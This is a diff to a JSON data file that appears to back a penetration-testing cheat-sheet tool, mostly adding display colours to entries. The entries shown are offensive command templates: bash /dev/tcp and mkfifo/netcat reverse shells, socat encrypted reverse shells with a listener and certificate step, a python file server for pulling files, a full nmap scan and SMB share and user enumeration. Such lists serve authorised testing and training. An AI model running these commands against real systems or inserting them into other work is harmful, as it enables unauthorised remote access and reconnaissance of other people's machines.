@@ -9,14 +9,15 @@
                 "qname": "RSB1",
                 "ctext": "bash -c ‘bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>1’",
                 "parms": ["LHOST","LPORT"],
-                "des": "Can be used to create a reverse shell from a Remote System to a Local system. \nParams:\n\tLHOST: Local System IP \n\tLPORT: Local Port system is listening on.
+                "des": "Can be used to create a reverse shell from a Remote System to a Local system. \nParams:\n\tLHOST: Local System IP \n\tLPORT: Local Port system is listening on."
 			},
             {
 				"lname": "Reverse Shell Bash2",
 				"qname": "RSB2",
 				"ctext": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
 				"parms": ["LHOST", "LPORT"],
-                "des": "Can be used to create a reverse shell from a Remote System to a Local system. \nParams:\n\tLHOST: Local System IP \n\tLPORT: Listening Port"
+                "des": "Can be used to create a reverse shell from a Remote System to a Local system. \nParams:\n\tLHOST: Local System IP \n\tLPORT: Listening Port",
+                "color": "#FDFD96"
 			},
             {
 				"lname": "Reverse Shell Socat",
@@ -37,21 +38,24 @@
 				"qname": "ScatEncF",
 				"ctext": "openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt && cat shell.key shell.crt > shell.pem",
 				"parms": [],
-                "des": "Creates an encryption file to encrypt traffic with socat. Used with Listener Socat Encrypted."
+                "des": "Creates an encryption file to encrypt traffic with socat. Used with Listener Socat Encrypted.",
+                "color": "#B5CCFE"
 			},
             {
 				"lname": "Reverse Shell Socat Encrypted",
 				"qname": "RSScatEnc",
 				"ctext": "socat OPENSSL:{LHOST}:{LPORT},verify=0 EXEC:/bin/bash",
 				"parms": ["LHOST","LPORT"],
-                "des": "Creates an ecrypted Reverse Shell with Listener Socat Encrypted. \nParams:\n\tLHOST: Local System IP\n\tLPORT: Listening Port"
+                "des": "Creates an ecrypted Reverse Shell with Listener Socat Encrypted. \nParams:\n\tLHOST: Local System IP\n\tLPORT: Listening Port",
+                "color": "#B5CCFE"
 			},
             {
 				"lname": "Listener Socat Encrypted",
 				"qname": "LstScatEnc",
 				"ctext": "socat OPENSSL-LISTEN:{LPORT},cert={Filename},verify=0 -",
 				"parms": ["LPORT", "Filename"],
-                "des": "Creates Encrypted Listener. Inorder to use you'll need to make an encryption file for the listener with Socat Encryption File.\nParams:\n\tLPORT: Listening Port\n\tFilename: Encryption Filename"
+                "des": "Creates Encrypted Listener. Inorder to use you'll need to make an encryption file for the listener with Socat Encryption File.\nParams:\n\tLPORT: Listening Port\n\tFilename: Encryption Filename",
+                "color": "#B5CCFE"
 			},
             {
 				"lname": "Reverse Shell Powershell",
@@ -77,7 +81,8 @@
 				"qname": "PHS",
 				"ctext": "python3 -m http.server 8000",
 				"parms": [],
-                "des": "Can use wget http://<IP>:8000/<filename> to download file"
+                "des": "Can use wget http://<IP>:8000/<filename> to download file",
+                "color": "#77DD77"
             },
 			{
                 "lname": "Powershell Download",
@@ -103,21 +108,24 @@
 				"qname": "NMAPDet",
 				"ctext": "nmap -p- -sT -sC -sV -O -T4 {RHOST} -oA {File}",
 				"parms": ["RHOST", "File"],
-                "des": "Scans all ports with TCP Scan, Script scan, Version scan, and OS scan. \nParams:\n\tRHOST: Remote System IP \n\tFile: General filename of output file. (no extension)"
+                "des": "Scans all ports with TCP Scan, Script scan, Version scan, and OS scan. \nParams:\n\tRHOST: Remote System IP \n\tFile: General filename of output file. (no extension)",
+                "color": "#FF6961"
             },
 			{
-                "lname": "SMB Enum nmap scan",
-				"qname": "SMBenum",
+                "lname": "Nmap SMB Enum scan",
+				"qname": "NMAPSMB",
 				"ctext": "nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse {RHOST} -oA {File}",
 				"parms": ["RHOST", "File"],
-                "des": "Nmap scan that uses common smb enum scripts. \nParams:\n\tRHOST: Remote System IP \n\tFile: General filename of output file. (no extension)"
+                "des": "Nmap scan that uses common smb enum scripts. \nParams:\n\tRHOST: Remote System IP \n\tFile: General filename of output file. (no extension)",
+                "color": "#FDFD96"
             },
 			{
                 "lname": "SMB Enum List Shares",
 				"qname": "SMBls",
 				"ctext": "smbclient -L \\\\\\\\{RHOST}",
 				"parms": ["RHOST"],
-                "des": "List Available Shares\nParams:\n\tRHOST: Remote System IP"
+                "des": "List Available Shares\nParams:\n\tRHOST: Remote System IP",
+                "color": "#FDFD96"
             },
 			{
                 "lname": "SNMP Enum",
